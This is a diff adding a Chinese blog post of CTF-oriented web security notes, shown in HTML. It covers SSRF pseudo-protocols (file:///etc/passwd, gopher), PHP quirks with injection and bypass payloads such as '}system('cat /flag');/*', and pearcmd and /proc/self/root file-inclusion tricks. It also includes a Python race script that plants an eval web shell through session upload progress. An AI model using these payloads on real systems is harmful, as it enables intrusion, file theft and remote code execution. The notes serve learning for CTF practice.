@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="xiao_fu_c">
+  
+
+  
+
+  
+
+  <title>WEB狗の综合笔记 | xiaofucの博客</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          xiaofucの博客
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">WEB狗の综合笔记</h1>
+          <h2 class="title-sub-wrap">
+            <strong>xiao_fu_c</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-05-07T13:15:50.000Z" itemprop="datePublished">2024-05-07</time>
+          </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="WEB安全综合笔记"><a href="#WEB安全综合笔记" class="headerlink" title="WEB安全综合笔记"></a>WEB安全综合笔记</h1><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><hr>
+<hr>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p><u>file:&#x2F;&#x2F;</u></p>
+<p>读取文件用，格式为：<strong>file:&#x2F;&#x2F;[文件路径]</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd   读取文件passwd</span><br><span class="line">file:///var/www/html/flag.php   读web目录下的flag.php</span><br><span class="line">file:///proc/net/arp   寻找内网其他主机</span><br><span class="line">file:///proc/net/fib_trie   显示当前网段路由信息</span><br></pre></td></tr></table></figure>
+
+
+
+<p><u>dict:&#x2F;&#x2F;</u></p>
+<p>可以拿来扫描端口，以下是利用dict伪协议来扫描127.0.0.1各个端口的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:8000</span><br></pre></td></tr></table></figure>
+
+<p>配合上burpsuite的intruder模块，在8000前后加上标记符号，再选择爆破范围，即可开始扫描。</p>
+<p><u>gopher:&#x2F;&#x2F;</u></p>
+<p>可以发送GET和POST请求，格式为：<strong>gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path>_TCP数据流</strong></p>
+<p>发送POST请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 内容的长度</span><br><span class="line"></span><br><span class="line">&lt;内容&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url编码两次，再加上gopher伪协议的形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher:127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250aHost:%2520127.0.0.1%250d%250aContent-Type:%2520application/x-www-form-urlencoded%250d%250aContent-Length:%252036%250d%250a%250d%250akey=c6e691f84d88409f2497fff9de3671ab%250d%250a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h3><p>当127.0.0.1或者localhost被ban掉的时候，可以使用进制转换的方法进行绕过。</p>
+<p>进制转换工具：<code>https://tool.520101.com/wangluo/jinzhizhuanhuan/</code></p>
+<h2 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><strong>create_function</strong></p>
+<p>根据传递的参数创建匿名函数，并为其返回唯一名称</p>
+<p>格式：<code>create_function(string $args,string $code)</code> </p>
+<p>特性：<code>string $code</code>部分使用了<code>eval()</code>函数，会造成任意代码执行。</p>
+<p><u>有关create_function函数的代码注入漏洞</u></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>类似于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>遇到形如<code>create_function(&#39;&#39;,$a)</code>的情况，可以构造<code>$a=&#125;system(&#39;cat /flag&#39;);/*</code>。</p>
+<p>即：先用}将等价的function闭合，然后加入自己的代码，最后使用多行注释<code>/*</code>毙掉后面的代码。</p>
+<p><strong>intval</strong></p>
+<p>用于将指定的变量转换为整数类型。</p>
+<p>格式：<code>intval($var, $base)</code></p>
+<p>$var放入需要转换的内容，$base放入转换的进制基数。</p>
+<p>实例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num1</span> = <span class="number">123.45</span>; <span class="comment">// 浮点数</span></span><br><span class="line"><span class="variable">$num2</span> = <span class="string">&quot;456&quot;</span>; <span class="comment">// 字符串类型的数字</span></span><br><span class="line"><span class="variable">$num3</span> = <span class="string">&quot;0xFF&quot;</span>; <span class="comment">// 十六进制表示的数字</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$integer1</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num1</span>); <span class="comment">// 将浮点数转换为整数</span></span><br><span class="line"><span class="variable">$integer2</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>); <span class="comment">// 将字符串类型的数字转换为整数</span></span><br><span class="line"><span class="variable">$integer3</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num3</span>, <span class="number">16</span>); <span class="comment">// 将十六进制表示的数字转换为整数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$integer1</span>; <span class="comment">// 输出：123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$integer2</span>; <span class="comment">// 输出：456</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$integer3</span>; <span class="comment">// 输出：255</span></span><br></pre></td></tr></table></figure>
+
+<p>特殊地，当$base为0时，会根据$var的类型自动选择进制，例如：</p>
+<p>$var为0x开头，则表示其为一个十六进制数，使用十六进制进行转换。</p>
+<p>为0开头，则表示为一个八进制数。</p>
+<p><strong>strpos</strong></p>
+<p>用于在字符串中查找某个子字符串的第一次出现位置。</p>
+<ul>
+<li>如果找到子字符串，则返回第一次出现的位置（索引），索引从 0 开始。</li>
+<li>如果没有找到子字符串，则返回 <code>false</code>。</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line"><span class="variable">$char</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pos</span>;   <span class="comment">//输出10</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>parse_url</strong></p>
+<p>用于解析URL字符串并返回一个关联数组，将一个完整的URL字符串解析成协议、主机、路径等独立字段。</p>
+<ul>
+<li><code>PHP_URL_SCHEME</code>：协议部分（例如：<code>http</code>、<code>https</code>）。</li>
+<li><code>PHP_URL_HOST</code>：主机部分 （例如：<a target="_blank" rel="noopener" href="http://www.example.com)./">www.example.com）。</a></li>
+<li><code>PHP_URL_PORT</code>：端口部分（例如：<code>80</code>、<code>443</code>）。</li>
+<li><code>PHP_URL_USER</code>：用户名部分。</li>
+<li><code>PHP_URL_PASS</code>：密码部分。</li>
+<li><code>PHP_URL_PATH</code>：路径部分。</li>
+<li><code>PHP_URL_QUERY</code>：查询参数部分。</li>
+<li><code>PHP_URL_FRAGMENT</code>：片段部分。</li>
+<li><code>PHP_URL_ALL</code>：返回包含所有 URL 部分的关联数组。</li>
+</ul>
+<p><strong>eval</strong></p>
+<p>其为一个语言构造器而非一个函数，无法被动态调用。</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;eval&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;br&gt;-----------分隔线---------&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后会发现<code>echo $a($c);</code> 可用但是<code>echo $b($c);</code>不可用</p>
+<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><h4 id="intval"><a href="#intval" class="headerlink" title="intval"></a><strong>intval</strong></h4><p>1.intval函数当传入的变量也是数组的时候，会返回1</p>
+<p>2.根据intval()函数的使用方法，当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值</p>
+<p>举例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;2e4&#x27;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) ; ----------<span class="number">2</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>) ; ----------<span class="number">20001</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a><strong>preg_match</strong></h4><p>preg_match函数当传入的变量为数组的时候，会返回0</p>
+<hr>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则表达式中&#x2F;m代表多行匹配，所以可以传入<code>?cmd=%0aphp</code>进行绕过，%0a是<u>url编码下的换行符</u>，这使得第一个if条件成立，第二个绕过。</p>
+<h4 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a><strong>is_file</strong></h4><p>在使用php伪协议的时候会返回false，除了使用file:&#x2F;&#x2F;协议。</p>
+<p>也可以使用目录溢出的payload使其返回false：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="escapeshellarg与escapeshellcmd"><a href="#escapeshellarg与escapeshellcmd" class="headerlink" title="escapeshellarg与escapeshellcmd"></a><strong>escapeshellarg与escapeshellcmd</strong></h4><p>两个函数顺序排序，会造成命令执行的漏洞。</p>
+<p>假定输入的是<code>&#39; whoami &#39;</code>，经过arg函数加工时，首先会在一整串字符串两边加上单引号：<code>&#39;&#39; whoami &#39;&#39;</code>，接着对原本存在的单引号用\号进行转义，变成：<code>&#39;\&#39; whoami &#39;\&#39;</code>，接着用两个单引号扣住刚才转义的<code>\&#39;</code>部分，变成：<code>&#39;&#39;\&#39;&#39; whoami &#39;\&#39;&#39;&#39;</code>。</p>
+<p>经过cmd函数加工时，它会把不配对的引号和\用\转义掉，但是两个\合在一起便使\号的转义功能被抹去，根据上述原理，最终变成：<code>&#39;&#39;\\&#39;&#39; whoami &#39;\\&#39;&#39;&#39;</code>。</p>
+<p>现在单引号两两闭合，使中间的命令不会被包围，被放了出来。</p>
+<h4 id="GET键值特性"><a href="#GET键值特性" class="headerlink" title="$_GET键值特性"></a>$_GET键值特性</h4><p>GET<code>数组获取</code>url<code>中</code>query<code>的参数，但是当其键值为一些特殊字符时，php会将其替换为</code>_</p>
+<p>会被转换成<code>_</code>的有：<code>.</code>、<code>空格</code>、<code>+</code>、<code>[</code>。</p>
+<h4 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h4><p>在遇到<code>%ff</code>等不可显字符时会把它自动删去：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var1</span>=<span class="string">&quot;/config.php/test&quot;</span></span><br><span class="line"><span class="title function_ invoke__">basename</span>(<span class="variable">$var1</span>)	=&gt; test</span><br><span class="line"><span class="variable">$var2</span>=<span class="string">&quot;/config.php/%ff&quot;</span></span><br><span class="line"><span class="title function_ invoke__">basename</span>(<span class="variable">$var2</span>)	=&gt;	config.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>define</strong></p>
+<p>用于定义一个常量</p>
+<p>格式：<code>define(string name,value)</code> name部分放常量的名称，value部分放常量对应的值，可以是任意的合法数据类型。</p>
+<p>举例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;CNM&quot;</span>,<span class="title function_ invoke__">phpinfo</span>());</span><br><span class="line"><span class="keyword">echo</span> CNM;   <span class="comment">//输出了phpinfo()函数的内容</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="绕过require-once函数"><a href="#绕过require-once函数" class="headerlink" title="绕过require_once函数"></a>绕过require_once函数</h3><p>遇到形如以下的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a>利用session.upload_progress进行文件包含</h3><p><strong>原理</strong>：</p>
+<p>PHP在开启<code>session.upload_progress.enable</code>选项后，会把用户上传的文件信息保存在Session中，从而在&#x2F;tmp目录中留下Session文件：sess_xxx。这里xxx指的是PHPSESSID</p>
+<p>利用时要满足以下三个条件：</p>
+<ul>
+<li>目标环境开启了<code>session.upload_progress.enable</code>选项</li>
+<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li>
+<li>请求的Cookie中包含Session ID</li>
+</ul>
+<p><strong>tips</strong>:</p>
+<p>需要创建session时，一般要在php代码中写入<code>session_start()</code>，当这个语句没有出现，并不代表不可以创建session。例如：在php.ini中设置<code>session.auto_start=On</code>时，也可以创建。</p>
+<p>phpinfo文件中可以看到一些关于session的关键配置信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on   //这个选项为on时，会导致上传的session文件一进去就被清空，遇到这种情况需要启动条件竞争</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://1.14.71.254:28592/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;xiaofuc.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用pear-cmd进行文件包含"><a href="#利用pear-cmd进行文件包含" class="headerlink" title="利用pear.cmd进行文件包含"></a>利用pear.cmd进行文件包含</h3><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
+
+<p>能将内容写入hello.php，搭配上文件包含漏洞进行包含即可。</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__construct()            //类的构造函数，实例化对象时触发</span><br><span class="line"></span><br><span class="line">__destruct()             //类的析构函数，对象被销毁时触发（new unserialize）</span><br><span class="line"></span><br><span class="line">__sleep()                //执行serialize()时，先会调用这个方法</span><br><span class="line"></span><br><span class="line">__wakeup()               //执行unserialize()时，先会调用这个方法</span><br><span class="line"></span><br><span class="line">__toString()             //echo或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发toString()</span><br><span class="line"></span><br><span class="line">__invoke()               //把对象当作函数调用时触发</span><br><span class="line"></span><br><span class="line">__call()                 //调用的不存在或受保护的方法的名称和参数</span><br><span class="line"></span><br><span class="line">__callStatic()           //静态调用或调用成员常量时使用的方法不存在</span><br><span class="line"></span><br><span class="line">__get()                  //调用的成员属性不存在</span><br><span class="line"></span><br><span class="line">__set()                  //在给不可访问属性赋值时触发</span><br><span class="line"></span><br><span class="line">__isset()                //当对不可访问属性调用 isset() 或 empty() 时触发</span><br><span class="line"></span><br><span class="line">__unset()                //在不可访问或**不存在**的属性上使用unset()时触发</span><br><span class="line"></span><br><span class="line">__clone()                //当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="原生类反序列化"><a href="#原生类反序列化" class="headerlink" title="原生类反序列化"></a>原生类反序列化</h3><h4 id="利用SplFileObject原生类进行文件读取"><a href="#利用SplFileObject原生类进行文件读取" class="headerlink" title="利用SplFileObject原生类进行文件读取"></a>利用SplFileObject原生类进行文件读取</h4><p>遇到形如：</p>
